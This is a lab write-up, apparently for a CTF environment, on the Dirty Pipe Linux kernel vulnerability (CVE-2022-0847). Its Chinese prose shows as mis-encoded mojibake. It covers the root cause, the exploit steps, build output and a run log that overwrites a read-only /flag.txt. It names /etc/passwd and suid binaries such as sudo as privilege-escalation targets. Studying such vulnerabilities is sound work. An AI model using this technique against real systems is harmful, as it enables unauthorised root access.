## ç¼–è¯‘é€‰é¡¹

- æœ¬äººé€‰æ‹© `linux-5.10.1` å†…æ ¸ç‰ˆæœ¬
```txt
CONFIG_SLAB=y
CONFIG_E1000=y 
CONFIG_E1000E=y
```

## åŸç†

å½±å“èŒƒå›´ï¼š 5.8 ç‰ˆæœ¬ä»¥ä¸Šçš„å†…æ ¸å‡ä¼šæ”¶åˆ°è¯¥æ¼æ´çš„å½±å“ï¼Œåœ¨ 5.16.11ã€5.15.25ã€5.10.102 ç‰ˆæœ¬ä¸­æ‰è¢«ä¿®å¤

è¯¦æƒ…è§[pdf](./CVE-2022-0847%20%20%20%20DirtyPipe.pdf)

1. pipe flagsä½¿ç”¨åæ²¡æœ‰æ¸…é™¤
2. splice 0æ‹·è´ä½¿ç”¨pipe ä¼ è¾“ã€‚


## steps

1. åˆ›å»ºç®¡é“ï¼Œè¯»å†™ä¸€æ¬¡ï¼Œä½¿å…¶flagä¸º`PIPE_BUF_FLAG_CAN_MERGE`
2. splice 0æ‹·è´ï¼Œå†™å…¥ä¸€ä¸ªå­—èŠ‚
3. å†™å…¥ç®¡é“ï¼Œç”±äºflagçš„é—®é¢˜ï¼Œå†™å…¥ä¹‹å‰çš„æ–‡ä»¶ï¼Œé€ æˆ**ä»»æ„å¯è¯»æ–‡ä»¶**çš„å†™

### how

- å¾€å¯è¯»æ–‡ä»¶ä¸­å†™å…¥ï¼Œæ¯”å¦‚ `/etc/passwd`
- suid æ–‡ä»¶å†™å…¥shellcode, æ¯”å¦‚ `sudo` å‘½ä»¤

## exploit

1. åˆ›å»ºä¸€ä¸ª`/flag.txt` å¹¶ä¸”è®¾ç½®ä¸ºå¯è¯»ï¼Œçœ‹èƒ½å¦æ”¹å†™
2. é‚£å†™å…¥ suidç¨‹åºåªéœ€è¦æŠŠå†™çš„å†…å®¹æ”¹æˆshellcode å°±è¡Œã€‚ä½†æ˜¯åˆ«å¿˜äº†æ¢å¤å†…å®¹ã€‚

- ç¼–è¯‘
```bash
make
    [+] start dirtypipe_writeany
    clang -static  dirtypipe_writeany.c -o dirtypipe_writeany
    [+] end
    [+] start dirtypipe_suid
    clang -static  dirtypipe_suid.c -o dirtypipe_suid
    [+] enmake 
```

- æ‰“åŒ…ç¯å¢ƒå†…
```bash
[ctf@busybox]-[/home/ctf] ğŸ¤£ ğŸ‘‰ ls
dirtypipe_writeany
[ctf@busybox]-[/home/ctf] ğŸ¤£ ğŸ‘‰ cat /flag.txt
flag{what_A_mAg1c_cve}
[ctf@busybox]-[/home/ctf] ğŸ¤£ ğŸ‘‰ ./dirtypipe_writeany /flag.txt 5 polluted
[+] get page size
[+] get and check args
[+] prepare pipe
[+] splice file
[+] write content to target file
[+] finish exploit!!
[ctf@busybox]-[/home/ctf] ğŸ¤£ ğŸ‘‰ cat /flag.txt
flag{pollutedAg1c_cve}
```

**åœ¨ä½¿ç”¨æ—¶å¯èƒ½clangæŠ¥é”™ï¼Œä¿®æ”¹**
```makefile
# change `CC := clang` to this
CC := gcc
```
**æ²¡æœ‰æµ‹è¯•è¿‡ä¿®æ”¹suid ç¨‹åºï¼Œæ²¡æœ‰ç¯å¢ƒ**

### busybox suid

! todo()

## dirty pipe åœ¨uaf ä½¿ç”¨

å¯ä»¥æ”¹å˜ pipe çš„flagï¼Œä»è€Œé¿å…äº† smep, smap, kpti ç­‰ä¿æŠ¤çš„ç»•è¿‡ã€‚ä½†æ˜¯éœ€è¦æ¯”è¾ƒå¤§çš„ heap size